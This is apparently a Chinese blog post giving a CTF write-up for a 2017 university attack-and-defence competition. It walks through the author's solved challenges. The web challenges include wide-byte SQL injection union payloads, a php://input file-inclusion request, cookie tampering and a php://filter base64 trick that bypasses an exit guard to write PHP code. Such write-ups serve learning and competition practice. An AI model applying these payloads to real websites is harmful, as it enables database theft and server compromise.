---
title: 华为杯网络攻防大赛
date: 2017-11-21 20:52:36
tags: [CTF,华为杯,校赛]
categories: 技术分享
---
# 2017年11月18日南京邮电大学华为杯网络攻防大赛

2泡面+1可乐+12小时=特等奖(第一名)

或许是这辈子拿到最多奖金的一次比赛了吧。特等奖2000，还有额外奖金(感谢队友)
<!-- more -->
<strong>以下说的完成是指主要完成,不仅仅是个人功劳,团队合作是很重要滴。</strong>
## 我完成的题目
* SQL初战
* 签到二
* 彭泽家族天下第一
* 逆向签到
* Easy WireShark
* 大神的求救1
* 梅子酒要充水卡
* 混合编码
* php (未在比赛中完成,也有额外奖金)
## 队友完成的题目
* 签到
* Ajax
* BabyRE
* Single(有额外奖金)
* BabyRsA
* Alice&Bob Revenge
* Just PY

### 放出write_up 纪念下(留一个笔记)
<strong>仅放出我完成的题目的write_up吗,其他的可以看我队友的[blog](https://mzi.red/2017/11/19/nyctf2017/#more)</strong>


1. SQL初战

  宽字节注入,与原来平台上的思路一样,可参考我以前的[blog](http://m.blog.csdn.net/dcison/article/details/53125540) 的sql injection 3
这里直接放playload了

  https://ctf11.nuptsast.com/index.php?id=%df' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() %23
得到表名 flag

  https://ctf11.nuptsast.com/index.php?id=%df' union select 1,group_concat(column_name) from information_schema.columns where table_name=0x666C6167 %23
得到字段名flag

  拿flag:https://ctf11.nuptsast.com/index.php?id=%df' union select 1,group_concat(flag) from flag %23

  flag{NJUPT_Sql_1nj3ction_ch4ll_c0mpl3t3!}
2. 签到2

  访问hint.txt得到提示文件读取
  构建playload

  <img src="http://wx4.sinaimg.cn/large/006m1w1Agy1flq0t6taajj30sn0biabj.jpg" />

  对其base64解码得到flag

  <img src="http://wx1.sinaimg.cn/large/006m1w1Agy1flq0t9kzqij30f80dr74s.jpg" />

3. 彭泽家族天下第一
  根据以前做的原题改cookie中的login=1,可得到源码

  <img src="http://wx3.sinaimg.cn/large/006m1w1Agy1flq0tbz0ppj31fu0pete8.jpg" />

  发现是做过的原题,直接上playload:

  https://ctf7.nuptsast.com/index.php?user=php://input&file=39adfa359d047dc2d867e3f706b2aae2
  
  同时post 数据: IM PengZeFan!(由于比赛采用了https平台,我burp未配置证书,只能让队友发送playload了,所以说队友是很重要滴)

  <img src="http://wx1.sinaimg.cn/mw690/006m1w1Agy1flq0tek7p3j30qw0kq40p.jpg"/>

4. 逆向签到

  没啥技术含量,直接winhex等软件打开搜索flag就得到了

  <img src="http://wx2.sinaimg.cn/large/006m1w1Agy1flq0tgjullj30gd02s3za.jpg" />

5. Easy WireShark

  比赛的时候超幸运一下就找到了,赛后写write_up找了超久。。。

  <img src="http://wx3.sinaimg.cn/mw690/006m1w1Agy1flq0u0zbjwj31510pnwmx.jpg" />

6. 大神的求救1
  题目：0x11-32 0x16-34123 0x0-23 0x7-33 0x146-4311提示是摩斯密码

  对'-'前的数字转2进制

  得到10001 10110 0 111 101000110

  '-'后面的数字是分段

  分别分段
  1. 100 11（3 2）
  2. 10110（34123）34123一共13位，位数不足补0 所以是 000 0000 0 10 110
  3. 0 （23） 00 000
  4. 111 （33）000 111
  5. 101000110 （4311）1010 001 1 0

  连接字符串100 01 000 0000 0 10 110 00 000 000 111 1010 001 1 0
  用'-'替换1,'.'替换0,得到:

  -.. .- ... .... . -. --. .. ... ... --- -.-. ..- - .

  在线解密就行了

  <img src="http://wx3.sinaimg.cn/mw690/006m1w1Agy1flq0u3be7kj30mz061jro.jpg" />

7. 梅子酒要充水卡

  给了两个文件,文件名分别是36 48 其实是代表金额数
  题目要说充100 RMB ,对两个文件逐行分析(左边那个是已经改好的,已经代表100RMB,原来是36RMB)

  <img src="http://wx4.sinaimg.cn/mw690/006m1w1Aly1flq0u5p3iaj315y035ta4.jpg"/>

  36的16进制是24，48的16进制是30,所以6400是100RMB而3000+CFFF = FFFF ，所以用FFFF-6400得9BFF
  
  所以Flag就是 64 9B(flag是数据段+校验段)

8. 混合编码

  同样是南邮ctf平台上原题(base全家桶)

  直接上以前人家写好的代码

  ```python
      import base64
      steps = []
      f = open ('code.txt','rb')
      p = f.read()
      n = ""

      while True:
          # Base16
          try:
              print ("[?] using base16 deocde")
              n = base64.b16decode(p)
              print ("[+] %s" % (n))
              steps.append(16)
              p = n
              continue
          except:
              pass
          # Base32
          try:
              print ("[?] using base32 deocde")
              n = base64.b32decode(p)
              print ("[+] %s" % (n))
              steps.append(32)
              p = n
              continue
          except:
              pass
          # Base64
          try:
              print ("[?] using base64 deocde")
              n = base64.b64decode(p)
              print ("[+] %s" % (n))
              steps.append(64)
              p = n
              continue
          except:
              pass
          break

      print ("[+] flag found : %s" % (n))
      print ("[+] steps : %s" % (steps))

  ```
  
   (借用了队友电脑跑的结果)

  <img src="http://wx4.sinaimg.cn/mw690/006m1w1Aly1flq0u7fzh2j30nm0coq5e.jpg" />

9. php (与额外奖金错过了,心痛)

  关键是如何[绕过exit](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)

  关键是这句话:

  “phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，"phpexita"被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是<?php exit; ?>没有了。

  这题中访问其根目录得到的提示存在一个flagggggg.php文件。所以构建b=a+php语句的base64编码(我写的是<?php show_source('flagggggg.php') ?>)

  <img src="http://wx1.sinaimg.cn/mw690/006m1w1Aly1flq1k013ylj310j0p3ah7.jpg" />
